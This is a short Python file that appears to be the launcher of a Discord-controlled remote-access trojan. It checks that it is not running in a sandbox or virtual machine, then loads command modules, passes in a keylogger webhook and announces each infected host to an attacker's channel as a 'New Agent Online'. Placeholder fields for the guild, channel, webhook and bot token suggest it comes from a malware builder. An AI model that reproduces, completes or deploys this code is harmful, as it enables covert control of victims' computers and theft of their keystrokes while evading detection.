
import asyncio
import discord
from code.discord.bot import BOT
from code.discord.cogs import commands
from libraries import sandboxevasion, maciassdopia


GUILD = discord.Object(id = "{GUILD}")
CHANNEL = int("{CHANNEL}")
KEYLOG_WEBHOOK = "{KEYLOG_WEBHOOK}"
CURRENT_AGENT = 0


bot = BOT(CHANNEL, GUILD)

if sandboxevasion.test() == True and maciassdopia.isVM() == False:
    config = maciassdopia.createConfig()
    ID = maciassdopia.id()

    asyncio.run(bot.add_cog(commands.HybridCommands(bot, GUILD, ID, KEYLOG_WEBHOOK)))

    if config:
        bot.msg = f"New Agent Online #{ID}"
        bot.color = 0x00ff00
    else:
        bot.msg =f"Agent Online #{ID}"
        bot.color = 0x0000FF

    bot.run("{TOKEN}")
